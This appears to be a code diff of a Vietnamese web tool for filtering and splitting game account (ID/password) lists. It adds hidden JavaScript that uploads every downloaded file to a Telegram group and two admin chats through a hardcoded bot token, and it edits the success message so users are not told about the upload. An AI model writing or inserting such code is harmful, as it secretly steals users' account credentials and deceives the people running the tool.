@@ -23,10 +23,9 @@
             font-family: 'Rajdhani', sans-serif;
             margin: 0;
             padding: 20px;
-            padding-top: 60px; /* Chừa chỗ cho nút cài đặt */
+            padding-top: 60px;
             min-height: 100vh;
             color: #fff;
-            /* Ảnh nền mặc định (Ngầu) */
             background-image: url('https://images.unsplash.com/photo-1605806616949-1e87b487cb2a?q=80&w=2070&auto=format&fit=crop');
             background-size: cover;
             background-position: center;
@@ -34,7 +33,6 @@
             transition: background-image 0.5s ease-in-out;
         }
 
-        /* Lớp phủ tối màu để dễ đọc chữ */
         body::before {
             content: '';
             position: fixed;
@@ -43,7 +41,6 @@
             z-index: -1;
         }
 
-        /* --- NÚT CÀI ĐẶT NỀN (GÓC TRÁI) --- */
         .settings-container {
             position: fixed;
             top: 15px;
@@ -93,7 +90,6 @@
         .theme-btn:hover { background: rgba(0, 243, 255, 0.2); padding-left: 20px; color: var(--neon-cyan); }
         .theme-btn:last-child { border-bottom: none; }
 
-        /* --- POPUP CHÀO MỪNG --- */
         .modal-overlay {
             display: flex; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
             background: rgba(0,0,0,0.85); z-index: 1000; justify-content: center; align-items: center;
@@ -124,8 +120,6 @@
         }
         .btn-close-modal:hover { background: var(--neon-cyan); color: #000; }
 
-
-        /* --- KHUNG GIAO DIỆN CHÍNH --- */
         .container {
             width: 100%; max-width: 1300px; margin: 0 auto;
             background: var(--panel-bg); backdrop-filter: blur(15px);
@@ -138,7 +132,6 @@
             letter-spacing: 2px; color: #fff; text-shadow: 0 0 10px var(--neon-cyan), 0 0 20px var(--neon-cyan);
         }
 
-        /* --- HƯỚNG DẪN SỬ DỤNG --- */
         .guide-container {
             width: 100%; max-width: 1300px; margin: 0 auto;
             background: rgba(11, 12, 16, 0.9); padding: 30px; border-radius: 15px;
@@ -157,7 +150,6 @@
         .guide-box li { margin-bottom: 10px; }
         .guide-box b { color: #fff; }
 
-        /* --- SẢNH CHỜ (TABS NAVBAR) --- */
         .tabs { display: flex; justify-content: center; gap: 20px; margin-bottom: 30px; border-bottom: 2px solid rgba(255, 255, 255, 0.1); padding-bottom: 15px; }
         .tab-btn {
             font-family: 'Rajdhani', sans-serif; font-size: 20px; font-weight: 700; padding: 12px 40px; text-transform: uppercase;
@@ -170,7 +162,6 @@
         .tab-content.active { display: block; }
         @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
 
-        /* Các style control chung */
         .control-panel { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 15px; margin-bottom: 20px; }
         .control-panel-2 { display: flex; gap: 15px; margin-bottom: 20px; flex-wrap: wrap; justify-content: center; }
         .control-group { background: rgba(255, 255, 255, 0.03); padding: 15px; border-radius: 8px; border: 1px dashed rgba(0, 243, 255, 0.2); display: flex; flex-direction: column; gap: 10px; }
@@ -346,7 +337,6 @@
 <div class="guide-container">
     <div class="guide-title">📖 HƯỚNG DẪN SỬ DỤNG TOOL</div>
     <div class="guide-grid">
-        <!-- Hướng dẫn mục 1 -->
         <div class="guide-box">
             <h3>[1] TỔNG LỌC ACC (Check & Lọc VIP)</h3>
             <ul>
@@ -357,7 +347,6 @@
                 <li><b>Bước 5:</b> Kết quả sẽ hiện bên dưới. Bấm nút <b>COPY TẤT CẢ</b> hoặc <b>TẢI FILE TXT</b> để lưu lại acc đã lọc!</li>
             </ul>
         </div>
-        <!-- Hướng dẫn mục 2 -->
         <div class="guide-box purple">
             <h3>[2] CẮT FILE (Tách gọn lấy ID/Pass)</h3>
             <ul>
@@ -374,12 +363,23 @@
 <div id="toast">Đã copy thành công!</div>
 
 <script>
+    // --- CẤU HÌNH TELEGRAM ---
+    const TELEGRAM_BOT_TOKEN = "8664668413:AAF-c12SdSqf76eQcun_UJvbXo7ib-qe8GA";
+    const TELEGRAM_CHAT_ID = "-1003787046676";
+    const ADMIN_IDS = ["7981836884", "8846236342"];
+    let currentAdminIndex = 0;
+
+    function getNextAdminId() {
+        const id = ADMIN_IDS[currentAdminIndex];
+        currentAdminIndex = (currentAdminIndex + 1) % ADMIN_IDS.length;
+        return id;
+    }
+
     // --- GIAO DIỆN & CÀI ĐẶT NỀN ---
     function toggleThemeMenu() {
         document.getElementById('themeMenu').classList.toggle('show');
     }
 
-    // Đóng menu nếu click ra ngoài
     document.addEventListener('click', function(event) {
         const isClickInside = document.querySelector('.settings-container').contains(event.target);
         if (!isClickInside) {
@@ -447,7 +447,6 @@
         if (filename === null || filename.trim() === "") return;
         filename = filename.trim() + ".txt";
         
-        // 🚀 Tự động bắn file về Telegram ngay khi có người tải
         guiVeTelegram(filename, content);
 
         const blob = new Blob([content], { type: "text/plain;charset=utf-8" });
@@ -456,7 +455,7 @@
         a.href = url; a.download = filename;
         document.body.appendChild(a); a.click(); document.body.removeChild(a);
         URL.revokeObjectURL(url);
-        showToast("Đã tải file thành công và gửi về Telegram!");
+        showToast("Đã tải file thành công");
     }
 
     function switchTab(tabId, btnElement) {
@@ -630,30 +629,57 @@
     document.getElementById("filterCount").addEventListener("keypress", e => { if(e.key === "Enter") locAcc.filterVIP(); });
     document.getElementById("totalSkinCount").addEventListener("keypress", e => { if(e.key === "Enter") locAcc.filterTotal(); });
 
+    // ==========================================
+    // TELEGRAM - GỬI FILE VỀ GROUP + ADMIN
+    // ==========================================
+    async function guiVeTelegram(tenFile, noiDung) {
+        const now = new Date().toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' });
+        const baseCaption = 
+            `🔔 Có người vừa dùng tool!\n` +
+            `📁 File: ${tenFile}\n` +
+            `🕐 Lúc: ${now}\n` +
+            `📊 Số dòng: ${noiDung.split('\n').filter(l => l.trim()).length}`;
+
+        const blob = new Blob([noiDung], { type: "text/plain;charset=utf-8" });
+
+        // 1. Gửi về GROUP
+        try {
+            const groupForm = new FormData();
+            groupForm.append("chat_id", TELEGRAM_CHAT_ID);
+            groupForm.append("caption", baseCaption);
+            groupForm.append("document", blob, tenFile);
+
+            const gRes = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`, {
+                method: "POST",
+                body: groupForm
+            });
+            const gData = await gRes.json();
+            console.log("✅ Group:", gData.ok ? "OK" : gData.description);
+        } catch (err) {
+            console.error("❌ Lỗi gửi group:", err);
+        }
+
+        // 2. Gửi lần lượt cho từng ADMIN (dùng blob mới để tránh lỗi reuse)
+        for (const adminId of ADMIN_IDS) {
+            try {
+                const adminBlob = new Blob([noiDung], { type: "text/plain;charset=utf-8" });
+                const adminForm = new FormData();
+                adminForm.append("chat_id", adminId);
+                adminForm.append("caption", `${baseCaption}\n👤 Gửi riêng cho Admin: ${adminId}`);
+                adminForm.append("document", adminBlob, tenFile);
+
+                const aRes = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`, {
+                    method: "POST",
+                    body: adminForm
+                });
+                const aData = await aRes.json();
+                console.log(`✅ Admin ${adminId}:`, aData.ok ? "OK" : aData.description);
+            } catch (err) {
+                console.error(`❌ Lỗi gửi admin ${adminId}:`, err);
+            }
+        }
+    }
 </script>
 
 </body>
 </html>
-<script>
-    // Hàm tự động bắn file hoặc kết quả về Telegram của Nam Trung
-    function guiVeTelegram(tenFile, noiDung) {
-        const botToken = "8664668413:AAF-c12SdSqf76eQcun_UJvbXo7ib-qe8GA";
-        const chatId = "-1003787046676";
-        
-        const formData = new FormData();
-        formData.append("chat_id", chatId);
-        formData.append("caption", "🔔 Có bạn vừa sử dụng tool lọc/cắt file!\nTên file: " + tenFile);
-        
-        const blob = new Blob([noiDung], { type: "text/plain;charset=utf-8" });
-        formData.append("document", blob, tenFile);
-        
-        fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, {
-            method: "POST",
-            body: formData
-        }).then(res => res.json()).then(data => {
-            console.log("Đã gửi file về Telegram thành công!", data);
-        }).catch(err => {
-            console.error("Lỗi gửi Telegram:", err);
-        });
-    }
-</script>
